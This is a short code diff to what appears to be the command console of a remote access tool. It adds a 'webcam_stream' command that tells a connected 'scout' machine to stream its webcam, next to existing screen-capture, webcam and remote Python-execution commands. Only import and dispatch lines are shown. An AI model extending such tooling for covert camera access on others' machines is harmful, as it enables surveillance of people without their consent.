@@ -1,5 +1,6 @@
 import time
 import socket
+import threading
 import library.commands.global_interface.clear as clear
 import library.commands.global_interface.quit as quit
 import library.commands.global_interface.python as python
@@ -11,6 +12,7 @@ import library.commands.direct_interface.screen as screen
 import library.commands.direct_interface.python_execute_file as python_execute_file
 import library.commands.direct_interface.webcam as webcam
 import library.commands.direct_interface.ping as ping
+import library.commands.direct_interface.webcam_stream as webcam_stream
 import library.modules.recv_all as recv_all
 import library.modules.send_all as send_all
 import library.modules.config as config
@@ -104,6 +106,9 @@ def main(scout_id):
             elif command == 'webcam':
                 send_all.main(config.scout_database[scout_id][0], command)
                 webcam.main(config.scout_database[scout_id][0])
+            elif command == 'webcam_stream':
+                send_all.main(config.scout_database[scout_id][0], command)
+                webcam_stream.main(config.scout_database[scout_id][0])
             elif command == 'ping':
                 alive_bool = ping.main(scout_id)
                 if not alive_bool:
